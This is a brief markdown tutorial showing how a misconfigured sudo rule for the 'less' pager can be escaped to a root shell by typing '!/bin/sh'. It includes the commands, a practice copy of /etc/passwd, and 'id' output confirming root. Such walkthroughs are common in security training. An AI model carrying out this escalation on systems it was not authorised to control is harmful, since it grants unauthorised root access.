### How to perform the `sudo less` exploit to gain root access in Linux terminal

First you must verify that you have `sudo` privileges and if so what...
  - **The following command will check for those privileges.**
    - _`sudo -l`_

#### If a users permissions in the **/etc/sudoers** file is configured incorrectly, this allows the specific user `sudo` access.
#### This then allows the user the ability to gain root access.

##### To test this on your own system first it is recommended that you copy a file such as **/etc/passwd** and save it to a desired location such as 
```
~/Documents/<new-file.txt>
```

To do this run the command
 ```
 cp /etc/passwd <new-file.txt>
 ```
Replace *<new-file.txt>* with the name you choose

Run this command from whatever directory you would like to save the file to.
To specify the save location you can use the absolute path like 
```
admin@ubuntu:/$ cp /etc/passwd ~/<Directory>/<my_file.txt>
```

##### This command copies */etc/passwd* and saves it to the */home/admin/Documents* also seen as *~/Documents*
```
admin@ubuntu:/$ cp /etc/passwd ~/Documents/passwd.txt
``` 

##### This is the current directory
```
admin@ubuntu:~/Documents$ pwd
/home/admin/Documents
```
We now run `sudo less <my_file.txt>`
  - _Inside the less prompt type this command:_
    - _`!/bin/sh`_
    - _Then press `ENTER`_
    
  - You should now have escalated your privileges to a root shell.
  - _`#`_

##### To check that you have done this properly you can use the `id` command as shown below:
  ```
  # id
  uid=0(root) gid=0(root) groups=0(root)
  #
  ```
 _To leave the shell use the following command:_
   - Type `exit` press `enter`
